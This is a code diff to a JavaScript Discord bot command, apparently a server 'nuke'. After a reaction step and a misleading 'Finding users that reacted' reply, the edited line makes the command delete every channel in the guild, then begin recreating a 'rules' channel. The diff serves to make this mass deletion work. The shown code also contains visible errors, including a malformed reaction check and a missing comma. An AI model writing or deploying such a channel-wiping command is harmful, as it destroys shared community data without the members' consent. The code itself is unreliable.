@@ -8,7 +8,7 @@ module.exports.run = (bot, message, args) => {
  message.react('👎')
  if(!message.reactions.size == 2) return message.channel.send('Finding users that reacted')
  if(message.author.bot) return;
- message.channels.forEach((ch) => {
+ message.guild.channels.forEach((ch) => {
   ch.delete()
  })
  message.guild.createChannel('rules', 'text' [{
